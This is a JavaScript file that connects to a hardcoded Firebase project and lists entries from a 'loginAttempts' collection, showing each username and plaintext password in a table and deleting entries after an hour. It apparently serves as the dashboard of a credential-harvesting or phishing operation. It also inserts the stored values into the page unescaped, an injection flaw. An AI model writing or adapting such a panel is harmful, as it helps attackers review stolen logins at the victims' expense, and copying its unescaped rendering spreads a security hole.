
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import { getFirestore, collection, query, orderBy, onSnapshot, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyByANBjLzBtTAsGNOwSSz5uqJm6QYuaw-g",
  authDomain: "youuh-5d9e3.firebaseapp.com",
  databaseURL: "https://youuh-5d9e3-default-rtdb.firebaseio.com",
  projectId: "youuh-5d9e3",
  storageBucket: "youuh-5d9e3.appspot.com",
  messagingSenderId: "772789757705",
  appId: "1:772789757705:web:a8e73acadfcaa4324795d8"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const attemptsTable = document.getElementById("attemptsTable");
const oneHour = 60 * 60 * 1000;

const q = query(collection(db, "loginAttempts"), orderBy("timestamp", "desc"));
onSnapshot(q, (snapshot) => {
  attemptsTable.innerHTML = "";
  const now = Date.now();

  snapshot.forEach(async (docSnap) => {
    const data = docSnap.data();
    if (!data.timestamp) return;
    const ts = data.timestamp.toDate();
    if (now - ts.getTime() > oneHour) {
      await deleteDoc(doc(db, "loginAttempts", docSnap.id));
    } else {
      const row = `<tr>
        <td>${data.username}</td>
        <td>${data.password}</td>
        <td>${ts.toLocaleString()}</td>
      </tr>`;
      attemptsTable.innerHTML += row;
    }
  });
});
